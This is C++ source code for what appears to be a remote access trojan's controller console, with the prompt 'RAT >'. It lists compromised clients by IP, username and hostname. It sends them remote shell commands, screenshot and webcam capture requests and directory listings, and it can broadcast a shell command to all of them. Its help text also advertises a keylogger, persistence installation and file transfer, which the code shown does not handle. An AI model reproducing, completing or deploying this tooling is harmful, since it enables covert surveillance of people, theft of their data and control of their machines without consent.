#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <csignal>
#include <atomic>

#include "server.h"

std::atomic<bool> running(true);

void signalHandler(int signum)
{
    std::cout << "Received signal " << signum << std::endl;
    running = false;
}

void printHelp()
{
    std::cout << "Available commands:" << std::endl;
    std::cout << "  help                 - Show this help message" << std::endl;
    std::cout << "  list                 - List connected clients" << std::endl;
    std::cout << "  select <client_id>   - Select a client to work with" << std::endl;
    std::cout << "  ping <client_id>     - Ping a client" << std::endl;
    std::cout << "  shell <client_id> <command> - Execute shell command on client" << std::endl;
    std::cout << "  screenshot <client_id> - Take a screenshot from client" << std::endl;
    std::cout << "  webcam <client_id>   - Capture webcam image from client" << std::endl;
    std::cout << "  files <client_id> <path> - List files in directory on client" << std::endl;
    std::cout << "  download <client_id> <remote_path> <local_path> - Download file from client" << std::endl;
    std::cout << "  upload <client_id> <local_path> <remote_path> - Upload file to client" << std::endl;
    std::cout << "  ps <client_id>       - List processes on client" << std::endl;
    std::cout << "  kill <client_id> <pid> - Kill process on client" << std::endl;
    std::cout << "  keylogger <client_id> <start|stop|dump> - Control keylogger" << std::endl;
    std::cout << "  persist <client_id>  - Install persistence on client" << std::endl;
    std::cout << "  unpersist <client_id> - Remove persistence from client" << std::endl;
    std::cout << "  broadcast <command>  - Execute command on all clients" << std::endl;
    std::cout << "  exit                 - Exit the program" << std::endl;
}

std::vector<std::string> splitCommand(const std::string &command)
{
    std::vector<std::string> parts;
    std::istringstream iss(command);
    std::string part;

    while (iss >> part)
    {
        parts.push_back(part);
    }

    return parts;
}

int main(int argc, char *argv[])
{
    // Register signal handler
    signal(SIGINT, signalHandler);

    // Default port
    uint16_t port = DEFAULT_PORT;

    // Parse command line arguments
    for (int i = 1; i < argc; ++i)
    {
        std::string arg = argv[i];
        if (arg == "-p" || arg == "--port")
        {
            if (i + 1 < argc)
            {
                port = static_cast<uint16_t>(std::stoi(argv[++i]));
            }
        }
        else if (arg == "-h" || arg == "--help")
        {
            std::cout << "Usage: " << argv[0] << " [options]" << std::endl;
            std::cout << "Options:" << std::endl;
            std::cout << "  -p, --port PORT   - Specify port (default: " << DEFAULT_PORT << ")" << std::endl;
            std::cout << "  -h, --help        - Show this help message" << std::endl;
            return 0;
        }
    }

    try
    {
        // Create server
        Server server(port);

        // Start server
        server.start();

        std::cout << "Server started. Type 'help' for available commands." << std::endl;

        // Main loop for command processing
        std::string selected_client;

        while (running)
        {
            // Print prompt
            if (!selected_client.empty())
            {
                std::cout << "RAT [" << selected_client << "] > ";
            }
            else
            {
                std::cout << "RAT > ";
            }

            // Get command
            std::string input;
            std::getline(std::cin, input);

            if (input.empty())
                continue;

            // Parse command
            auto parts = splitCommand(input);
            std::string command = parts[0];

            // Process command
            if (command == "help")
            {
                printHelp();
            }
            else if (command == "exit")
            {
                break;
            }
            else if (command == "list")
            {
                auto clients = server.getClientList();
                if (clients.empty())
                {
                    std::cout << "No clients connected." << std::endl;
                }
                else
                {
                    std::cout << "Connected clients:" << std::endl;
                    for (size_t i = 0; i < clients.size(); ++i)
                    {
                        auto client = server.getClient(clients[i]);
                        if (client)
                        {
                            std::cout << i + 1 << ". " << clients[i] << " - "
                                      << client->getIPAddress() << " - "
                                      << client->getUsername() << "@" << client->getHostname()
                                      << " (" << client->getOSInfo() << ")" << std::endl;
                        }
                    }
                }
            }
            else if (command == "select")
            {
                if (parts.size() < 2)
                {
                    std::cout << "Usage: select <client_id>" << std::endl;
                }
                else
                {
                    std::string client_id = parts[1];
                    auto client = server.getClient(client_id);
                    if (client && client->isConnected())
                    {
                        selected_client = client_id;
                        std::cout << "Selected client: " << client_id << std::endl;
                    }
                    else
                    {
                        std::cout << "Client not found or not connected: " << client_id << std::endl;
                    }
                }
            }
            else if (command == "ping")
            {
                std::string client_id;
                if (parts.size() < 2)
                {
                    if (selected_client.empty())
                    {
                        std::cout << "No client selected. Use 'select <client_id>' first." << std::endl;
                        continue;
                    }
                    client_id = selected_client;
                }
                else
                {
                    client_id = parts[1];
                }

                auto client = server.getClient(client_id);
                if (client && client->isConnected())
                {
                    std::cout << "Pinging client " << client_id << "..." << std::endl;
                    client->executeCommand(CMD_PING);
                }
                else
                {
                    std::cout << "Client not found or not connected: " << client_id << std::endl;
                }
            }
            else if (command == "shell")
            {
                std::string client_id;
                if (parts.size() < 2)
                {
                    if (selected_client.empty())
                    {
                        std::cout << "No client selected. Use 'select <client_id>' first." << std::endl;
                        continue;
                    }
                    client_id = selected_client;
                }
                else
                {
                    client_id = parts[1];
                }

                if (parts.size() < (selected_client.empty() ? 3 : 2))
                {
                    std::cout << "Usage: shell <client_id> <command>" << std::endl;
                    continue;
                }

                auto client = server.getClient(client_id);
                if (client && client->isConnected())
                {
                    // Build shell command
                    std::string shell_command;
                    size_t start_idx = selected_client.empty() ? 2 : 1;
                    for (size_t i = start_idx; i < parts.size(); ++i)
                    {
                        if (i > start_idx)
                            shell_command += " ";
                        shell_command += parts[i];
                    }

                    std::cout << "Executing command on client " << client_id << ": " << shell_command << std::endl;

                    // Convert command to bytes
                    std::vector<uint8_t> payload(shell_command.begin(), shell_command.end());
                    client->executeCommand(CMD_SHELL_EXEC, payload);
                }
                else
                {
                    std::cout << "Client not found or not connected: " << client_id << std::endl;
                }
            }
            else if (command == "screenshot")
            {
                std::string client_id;
                if (parts.size() < 2)
                {
                    if (selected_client.empty())
                    {
                        std::cout << "No client selected. Use 'select <client_id>' first." << std::endl;
                        continue;
                    }
                    client_id = selected_client;
                }
                else
                {
                    client_id = parts[1];
                }

                auto client = server.getClient(client_id);
                if (client && client->isConnected())
                {
                    std::cout << "Taking screenshot from client " << client_id << "..." << std::endl;
                    client->executeCommand(CMD_SCREENSHOT);
                }
                else
                {
                    std::cout << "Client not found or not connected: " << client_id << std::endl;
                }
            }
            else if (command == "webcam")
            {
                std::string client_id;
                if (parts.size() < 2)
                {
                    if (selected_client.empty())
                    {
                        std::cout << "No client selected. Use 'select <client_id>' first." << std::endl;
                        continue;
                    }
                    client_id = selected_client;
                }
                else
                {
                    client_id = parts[1];
                }

                auto client = server.getClient(client_id);
                if (client && client->isConnected())
                {
                    std::cout << "Capturing webcam image from client " << client_id << "..." << std::endl;
                    client->executeCommand(CMD_WEBCAM_CAPTURE);
                }
                else
                {
                    std::cout << "Client not found or not connected: " << client_id << std::endl;
                }
            }
            else if (command == "files")
            {
                std::string client_id;
                if (parts.size() < 2)
                {
                    if (selected_client.empty())
                    {
                        std::cout << "No client selected. Use 'select <client_id>' first." << std::endl;
                        continue;
                    }
                    client_id = selected_client;
                }
                else
                {
                    client_id = parts[1];
                }

                if (parts.size() < (selected_client.empty() ? 3 : 2))
                {
                    std::cout << "Usage: files <client_id> <path>" << std::endl;
                    continue;
                }

                auto client = server.getClient(client_id);
                if (client && client->isConnected())
                {
                    // Get path
                    std::string path = parts[selected_client.empty() ? 2 : 1];

                    std::cout << "Listing files in " << path << " on client " << client_id << "..." << std::endl;

                    // Convert path to bytes
                    std::vector<uint8_t> payload(path.begin(), path.end());
                    client->executeCommand(CMD_FILE_LIST, payload);
                }
                else
                {
                    std::cout << "Client not found or not connected: " << client_id << std::endl;
                }
            }
            else if (command == "broadcast")
            {
                if (parts.size() < 2)
                {
                    std::cout << "Usage: broadcast <command>" << std::endl;
                    continue;
                }

                // Build shell command
                std::string shell_command;
                for (size_t i = 1; i < parts.size(); ++i)
                {
                    if (i > 1)
                        shell_command += " ";
                    shell_command += parts[i];
                }

                std::cout << "Broadcasting command to all clients: " << shell_command << std::endl;

                // Convert command to bytes
                std::vector<uint8_t> payload(shell_command.begin(), shell_command.end());
                server.broadcastCommand(CMD_SHELL_EXEC, payload);
            }
            else
            {
                std::cout << "Unknown command: " << command << std::endl;
                std::cout << "Type 'help' for available commands." << std::endl;
            }
        }

        // Stop server
        server.stop();
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}